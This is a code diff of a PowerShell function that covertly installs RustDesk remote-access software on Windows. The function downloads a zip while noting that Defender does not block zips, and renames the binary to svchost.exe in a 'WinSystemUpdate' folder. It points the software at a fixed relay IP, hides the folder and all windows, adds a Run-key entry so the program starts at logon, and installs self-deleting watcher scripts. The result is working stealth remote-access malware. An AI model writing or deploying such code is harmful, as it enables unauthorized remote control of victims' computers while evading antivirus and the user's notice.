@@ -6,34 +6,41 @@ function Install-RD {
     $cfgDir = "$env:APPDATA\RustDesk\config"
     $zipUrl = 'https://github.com/kk70226581/rd-files/releases/download/v1.0/update.zip'
 
-    # 1. Kill old + clean
-    Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
-    Start-Sleep 1
+    # 1. Kill ALL old instances first - so no file locks
+    Get-Process svchost -EA SilentlyContinue |
+        Where-Object { $_.Path -like "*WinSystem*" } |
+        Stop-Process -Force -EA SilentlyContinue
+    Get-Process -Name "svchost" -EA SilentlyContinue |
+        Where-Object { $_.Path -eq $EXE } |
+        Stop-Process -Force -EA SilentlyContinue
+    Start-Sleep 2
+
+    # 2. Clean old folder completely
     Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
+    Start-Sleep 1
     New-Item -ItemType Directory $DEST   -Force | Out-Null
     New-Item -ItemType Directory $cfgDir -Force | Out-Null
 
-    # 2. Download as zip - Defender does not block zip files
+    # 3. Download zip (Defender does not block zips)
     Write-Host "Installing..." -ForegroundColor Cyan
-    $zipPath = "$DEST\update.zip"
+    $zipPath = "$env:TEMP\update_rd.zip"
+    Remove-Item $zipPath -Force -EA SilentlyContinue
     (New-Object System.Net.WebClient).DownloadFile($zipUrl, $zipPath)
 
     if (!(Test-Path $zipPath) -or (Get-Item $zipPath).Length -lt 1MB) {
         Write-Host "Download failed!" -ForegroundColor Red; return
     }
 
-    # 3. Extract chrome.exe and sciter.dll from zip
+    # 4. Extract to DEST (folder is fresh, no locks)
     Add-Type -AssemblyName System.IO.Compression.FileSystem
     $z = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
     foreach ($entry in $z.Entries) {
-        try {
-            if ($entry.Name -eq 'chrome.exe') {
-                [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $EXE, $true)
-            }
-            if ($entry.Name -eq 'sciter.dll') {
-                [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $DLL, $true)
-            }
-        } catch {}
+        if ($entry.Name -eq 'chrome.exe') {
+            [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $EXE, $true)
+        }
+        if ($entry.Name -eq 'sciter.dll') {
+            [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $DLL, $true)
+        }
     }
     $z.Dispose()
     Remove-Item $zipPath -Force -EA SilentlyContinue
@@ -42,7 +49,7 @@ function Install-RD {
         Write-Host "Extraction failed!" -ForegroundColor Red; return
     }
 
-    # 4. Config
+    # 5. Config
     @'
 rendezvous_server = '34.107.221.82'
 relay_server = '34.107.221.82'
@@ -64,36 +71,40 @@ salt = ''
 key_confirmed = true
 '@ | Set-Content "$cfgDir\RustDesk.toml" -Encoding UTF8
 
-    # 5. Hide folder
+    # 6. Hide folder
     try { $f = Get-Item $DEST -Force; $f.Attributes = $f.Attributes -bor 2 -bor 4 } catch {}
 
-    # 6. Get ID silently first
+    # 7. Get ID silently - no window
     $psiId = New-Object System.Diagnostics.ProcessStartInfo
     $psiId.FileName=$EXE; $psiId.Arguments='--get-id'
-    $psiId.UseShellExecute=$false; $psiId.RedirectStandardOutput=$true
-    $psiId.CreateNoWindow=$true; $psiId.WorkingDirectory=$DEST
+    $psiId.UseShellExecute=$false
+    $psiId.RedirectStandardOutput=$true
+    $psiId.CreateNoWindow=$true
+    $psiId.WorkingDirectory=$DEST
     $prId = [System.Diagnostics.Process]::Start($psiId)
     $outT = $prId.StandardOutput.ReadToEndAsync()
     $prId.WaitForExit(8000) | Out-Null
     $RDID = $outT.Result.Trim()
 
-    # 7. Start RustDesk fully hidden - no window at all
+    # 8. Start RustDesk hidden - CreateNoWindow kills any UI
     $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName=$EXE; $psi.WorkingDirectory=$DEST
+    $psi.FileName=$EXE
+    $psi.WorkingDirectory=$DEST
     $psi.UseShellExecute=$false
     $psi.CreateNoWindow=$true
     [System.Diagnostics.Process]::Start($psi) | Out-Null
     Start-Sleep 2
 
-    # 8. Force hide any window that appeared
+    # 9. Force hide any window that appeared
     Add-Type -Name WH -Namespace NH -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);' -EA SilentlyContinue
-    Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | ForEach-Object { [NH.WH]::ShowWindow($_.MainWindowHandle, 0) | Out-Null }
+    Get-Process svchost -EA SilentlyContinue |
+        Where-Object { $_.Path -like "*WinSystem*" } |
+        ForEach-Object { [NH.WH]::ShowWindow($_.MainWindowHandle, 0) | Out-Null }
 
-    # 9. Auto-start on boot via registry (no admin needed)
-    $reg = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
-    Set-ItemProperty $reg 'WinSystemUpdate' $EXE -Force
+    # 10. Auto-start on boot via registry (no admin needed)
+    Set-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'WinSystemUpdate' $EXE -Force
 
-    # 10. Delete script
+    # 11. Watcher - auto deletes when process stops OR after 1 hour
     $del = "$DEST\delete.ps1"
     Set-Content $del @'
 $d = "$env:LOCALAPPDATA\WinSystemUpdate"
@@ -103,11 +114,10 @@ Start-Sleep 2
 Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue
 '@ -Encoding UTF8
 
-    # 11. Watcher - auto deletes when process stops OR after 1 hour
     $watch = "$DEST\watch.ps1"
     Set-Content $watch @'
-$EXE      = "$env:LOCALAPPDATA\WinSystemUpdate\svchost.exe"
-$del      = "$env:LOCALAPPDATA\WinSystemUpdate\delete.ps1"
+$EXE = "$env:LOCALAPPDATA\WinSystemUpdate\svchost.exe"
+$del = "$env:LOCALAPPDATA\WinSystemUpdate\delete.ps1"
 $deadline = [DateTime]::Now.AddHours(1)
 while ([DateTime]::Now -lt $deadline) {
     Start-Sleep 10
